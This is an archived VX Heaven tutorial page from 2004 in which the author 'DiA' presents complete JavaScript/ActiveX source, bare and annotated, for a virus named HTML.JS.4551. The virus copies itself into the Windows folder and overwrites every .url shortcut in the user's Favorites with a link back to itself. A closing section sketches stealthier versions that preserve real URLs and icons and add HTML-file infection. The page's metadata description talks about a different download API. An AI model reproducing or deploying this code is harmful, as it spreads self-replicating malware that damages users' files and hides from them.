<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> DiA 'Your favorites, my victims - .url infection in JavaScript' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="DiA"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, DiA,Your favorites, my victims - .url infection in JavaScript, urlfile, victim, winfolder, urltype, findfile, writeline, windows, wshell, favorit, activexobject, thisfile, site, read, sample, string"/>
<meta name="Description" content="Hello again, today I want to show you a method to download a file from the internet (http) to the local machine. It's very easy with the URLDownloadToFileA API, but this API is not much commented. So I resulute to write this tutorial. I hope with this codes you are Up to Date =). Have fun..."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"fc615eae2b3d5e25d41677aeb58cdac24d1ce4bb-1498757644-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vdi04.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Your favorites, my victims - .url infection in JavaScript</h1><p><a href="/lib/?lang=en&amp;author=DiA"> DiA</a><br/> <em><a href="/vx.php?fid=1375#f1375">Ready Rangers Liberation Front [5]</a></em><br/> <em>May 2004</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vdi04.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vdi04">Back to index</a>] [<a href="/lib/vdi04.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c1">Intro</a></li>
<li><a href="#c2">URL file format</a></li>
<li><a href="#c3">Code with description</a></li>
<li><a href="#c4">Idea's and Goal's</a></li>
<li><a href="#c5">Outro</a></li>
</ul>
<h2><a name="c1"></a>Intro</h2>
<p>Everybody has favorite site's in the i-net. But they can't remember all the URL's, so they add every site they use to the "favorites". You can found them on IE under menu "favorites" (what else?!). But you will only see the page's title, like "VX Heavens" or "vx - DiA" ;). But where are the link's to this sites? It store's as *.url file in the "favorites" folder in windows, like "C:\Windows\Favorites". In this tut we want to overwrite this *.url files, with a .url file linked to our Virus. Let's do this...</p>
<p>...have fun!</p>
<h2><a name="c2"></a>URL file format</h2>
<table summary="Internet Shortcut File info" border="1">
<tr><td>[InternetShortcut]</td><td>hey windows, it's a InternetShurtcut!</td></tr>
<tr><td>URL=http://www.vx-dia.de.vu/</td><td>the linked site, our virus will be in location "file:///C:\Windows\4551.htm"</td></tr>
<tr><td>WorkingDirectory=C:\WINDOWS\</td><td>not interresting for this tut</td></tr>
<tr><td>ShowCommand=7</td><td>not interresting for this tut</td></tr>
<tr><td>IconIndex=1</td><td>not interresting for this tut</td></tr>
<tr><td>IconFile=C:\WINDOWS\SYSTEM\url.dll</td><td>not interresting for this tut</td></tr>
<tr><td>Modified=20F06BA06D07BD014D</td><td>not interresting for this tut</td></tr>
<tr><td>HotKey=1601</td><td>not interresting for this tut</td></tr>
</table>
<h2><a name="c3"></a>Code with description</h2>
<p>First without description:</p>
<div class="html" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&lt;html&gt;<br/>
&lt;head&gt;<br/>
&lt;script language=&quot;JavaScript&quot;&gt;<br/>
<br/>
ThisFile = location.href;<br/>
<br/>
if (ThisFile.indexOf(&quot;file:///&quot;) != -1) {<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; wshell = new ActiveXObject(&quot;WScript.Shell&quot;);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; fso = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;)<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; FavFolder = wshell.SpecialFolders(&quot;Favorites&quot;) + &quot;\\&quot;;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; WinFolder = fso.GetSpecialFolder(0) + &quot;\\&quot;;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ThisFile = location.href.substr(8);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Virus = fso.GetFile(ThisFile);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Virus.Copy(WinFolder + &quot;4551.htm&quot;);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; fso.CreateTextFile(WinFolder + &quot;4551.url&quot;);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; URLFile = fso.OpenTextFile(WinFolder + &quot;4551.url&quot;,2,false,0);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; URLFile.WriteLine(&quot;[InternetShortcut]&quot;);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; URLFile.WriteLine(&quot;URL=file:///&quot; + WinFolder + &quot;4551.htm&quot;);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; URLFile.Close();<br/>
&nbsp; &nbsp; &nbsp; &nbsp; FakeURL = fso.GetFile(WinFolder + &quot;4551.url&quot;);<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Favorit = fso.GetFolder(FavFolder);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; FindFile = new Enumerator(Favorit.Files);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; FindFile.moveFirst();<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; while (FindFile.atEnd() == false) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Victim = FindFile.item();<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; URLType = new String(Victim);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; len = URLType.length;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (URLType.indexOf(&quot;url&quot;,len-3) != -1) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FakeURL.Copy(Victim);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FindFile.moveNext();<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
}<br/>
<br/>
else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; alert(&quot;HTML.JS.4551 - Virus\n\nOnly a *.url infection sample!\n\n\n\Only works's under loacation file:///\n\n\n\n\nby DiA (c)04 - www.vx-dia.de.vu&quot;);<br/>
}<br/>
<br/>
&lt;/script&gt;<br/>
&lt;/head&gt;<br/>
<br/>
&lt;body link=&quot;#000000&quot; alink=&quot;#000000&quot; vlink=&quot;#000000&quot;&gt;<br/>
&lt;div align=&quot;center&quot;&gt;<br/>
&lt;h1&gt;HTML.JS.4551 - *.url infection sample&lt;/h1&gt;&lt;br&gt;&lt;br&gt;<br/>
<br/>
by DiA (c)04 GermanY&lt;br&gt;<br/>
&lt;a href=&quot;http://www.vx-dia.de.vu&quot;&gt;www.vx-dia.de.vu&lt;/a&gt;&lt;br&gt;<br/>
&lt;a href=&quot;mailto:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e5a18ca4ba8d84918096ba8884868d8c8b80a582889dcb8180">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&quot;&gt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d397ba928cbbb2a7b6a08cbeb2b0bbbabdb693b4beabfdb7b6">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&lt;/a&gt;&lt;/div&gt;<br/>
&lt;/body&gt;<br/>
&lt;/html&gt;<br/>
&nbsp;</div>
<p>And now with description for better understanding, but ugly lookin ;) :</p>
<div class="html" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&lt;html&gt;<br/>
&lt;head&gt;<br/>
&lt;script language=&quot;JavaScript&quot;&gt;<br/>
<br/>
// we do it in JavaScript<br/>
<br/>
<br/>
ThisFile = location.href;<br/>
<br/>
//looks like &quot;file:///C:\Tests\4551.htm&quot;<br/>
<br/>
<br/>
if (ThisFile.indexOf(&quot;file:///&quot;) != -1) {<br/>
<br/>
// only run virus if location is &quot;file:///&quot; and not &quot;http://&quot;<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; wshell = new ActiveXObject(&quot;WScript.Shell&quot;);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; fso = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;)<br/>
<br/>
// create wshell to read the &quot;Favorites&quot; path<br/>
// create fso to handle files<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; FavFolder = wshell.SpecialFolders(&quot;Favorites&quot;) + &quot;\\&quot;;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; WinFolder = fso.GetSpecialFolder(0) + &quot;\\&quot;;<br/>
<br/>
// save &quot;Favorites&quot; path to infect .url files<br/>
// save &quot;Windows&quot; path to copy virus, and drop Fake .url file<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ThisFile = location.href.substr(8);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Virus = fso.GetFile(ThisFile);<br/>
<br/>
// remove &quot;file:///&quot; to handle with the path<br/>
// get virus file, to copy it<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Virus.Copy(WinFolder + &quot;4551.htm&quot;);<br/>
<br/>
// copy virus to Windows\4551.htm, like &quot;C:\Windows\4551.htm&quot;<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; fso.CreateTextFile(WinFolder + &quot;4551.url&quot;);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; URLFile = fso.OpenTextFile(WinFolder + &quot;4551.url&quot;,2,false,0);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; URLFile.WriteLine(&quot;[InternetShortcut]&quot;);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; URLFile.WriteLine(&quot;URL=file:///&quot; + WinFolder + &quot;4551.htm&quot;);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; URLFile.Close();<br/>
&nbsp; &nbsp; &nbsp; &nbsp; FakeURL = fso.GetFile(WinFolder + &quot;4551.url&quot;);<br/>
<br/>
// create FakeURL file, every time<br/>
// write the path to the virus in this .url<br/>
// now 4551.url looks like:<br/>
// &nbsp;[InternetShortcut]<br/>
// &nbsp;URL=file:///C:\Windows\4551.htm<br/>
// if you execute this 4551.url, you will see the virus again ;)<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Favorit = fso.GetFolder(FavFolder);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; FindFile = new Enumerator(Favorit.Files);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; FindFile.moveFirst();<br/>
<br/>
// get favorite folder to handle with it<br/>
// create a new enumerator to find all (!) files in this directory<br/>
// find first file<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; while (FindFile.atEnd() == false) {<br/>
<br/>
// do a while(), to find all files in one directory<br/>
// if no more files -&gt; exit while()<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Victim = FindFile.item();<br/>
<br/>
// save path of victim, like &quot;C:\Windows\Favorites\GMX.url&quot;<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; URLType = new String(Victim);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; len = URLType.length;<br/>
<br/>
// create a new string object of the victim path, to handle with<br/>
// get lenght of the path, to check extensions of files<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (URLType.indexOf(&quot;url&quot;,len-3) != -1) {<br/>
<br/>
// infect only if last 3 char's contains &quot;url&quot;<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FakeURL.Copy(Victim);<br/>
<br/>
// overwrite victim with dropped FakeURL file<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FindFile.moveNext();<br/>
<br/>
// Find next file in &quot;favorites&quot; folder<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
}<br/>
<br/>
// end if<br/>
<br/>
<br/>
else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; alert(&quot;HTML.JS.4551 - Virus\n\nOnly a *.url infection sample!\n\n\n\Only works's under loacation file:///\n\n\n\n\nby DiA (c)04 - www.vx-dia.de.vu&quot;);<br/>
}<br/>
<br/>
// if we are on another location (like ftp:// or http://) show only a message, and DON'T run<br/>
// virus file<br/>
<br/>
<br/>
&lt;/script&gt;<br/>
&lt;/head&gt;<br/>
<br/>
&lt;body link=&quot;#000000&quot; alink=&quot;#000000&quot; vlink=&quot;#000000&quot;&gt;<br/>
&lt;div align=&quot;center&quot;&gt;<br/>
&lt;h1&gt;HTML.JS.4551 - *.url infection sample&lt;/h1&gt;&lt;br&gt;&lt;br&gt;<br/>
<br/>
by DiA (c)04 GermanY&lt;br&gt;<br/>
&lt;a href=&quot;http://www.vx-dia.de.vu&quot;&gt;www.vx-dia.de.vu&lt;/a&gt;&lt;br&gt;<br/>
&lt;a href=&quot;mailto:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="15517c544a7d746170664a7874767d7c7b705572786d3b7170">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&quot;&gt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6d29042c32050c19081e32000c0e050403082d0a0015430908">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&lt;/a&gt;&lt;/div&gt;<br/>
&lt;/body&gt;<br/>
&lt;/html&gt;<br/>
&nbsp;</div>
<h2><a name="c4"></a>Idea's and Goal's</h2>
<p>The user will check that somethin is wrong, when no favorite work's anymore! So we must find a way to infect .url's, but load the site that should be load! So, we must read first the real URL before overwrite the .url.</p>
<p>Maybe we found the file "vx - DiA.url":</p>
<ol>
<li>Read real URL from this file</li>
<li>store it in another file, like "vx - DiA.txt"</li>
<li>overwrite this file with FakeURL file</li>
</ol>
<p>When the "vx - DiA.url" are executed, the virus will do the work:</p>
<ol>
<li>Infect files</li>
<li>read real URL from "vx - DiA.txt"</li>
<li>load this site</li>
</ol>
<p>I am workin on this method, but the problem is that every .url is not the same like:</p>
<pre class="source">
[InternetShortcut]
URL=http://www.vx-dia.de.vu
</pre>
<p>Someone look's like:</p>
<pre class="source">
[DEFAULT]
BASEURL=http://www.f-prot.de/down/tools-f.php

[InternetShortcut]
URL=http://www.f-prot.de/down/tools-f.php
IconFile=http://www.f-prot.de/favicon.ico
IconIndex=1
</pre>
<p>Another problem is, that most .url files has a own Icon, so we must read the icon location and write this locatin in our FakeURL file, that it look's like:</p>
<pre class="source">
[InternetShortcut]
URL=file:///C:\Windows\4551.htm
IconFile=http://www.f-prot.de/favicon.ico
IconIndex=1
</pre>
<p>I am working on this problem's, and write a HTML.JS Virus:</p>
<ul>
<li>.html infection -> prepender</li>
<li>.url infection -> load real site</li>
<li>don't change icon, or something, only change URL=...</li>
<li>and other features...</li>
</ul>
<h2><a name="c5"></a>Outro</h2>
<p>I hope you enjoyed this little tutorial, if you had any comment's send me a mail to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="85c1ecc4daede4f1e0f6dae8e4e6edecebe0c5e2e8fdabe1e0">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> ! That's all at this time, now i go on with the problem's =)</p>
<p>Have fun... Code on...</p>
<div align="right">bye, DiA [06.05.04 - GermanY]</div>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vdi04">de</a><a href="/lib/index.php?lang=en&amp;id=vdi04">en</a><a href="/lib/index.php?lang=es&amp;id=vdi04">es</a><a href="/lib/index.php?lang=it&amp;id=vdi04">it</a><a href="/lib/index.php?lang=fr&amp;id=vdi04">fr</a><a href="/lib/index.php?lang=pl&amp;id=vdi04">pl</a><a href="/lib/index.php?lang=ru&amp;id=vdi04">ru</a><a href="/lib/index.php?lang=ua&amp;id=vdi04">ua</a></div>
</body>
</html>
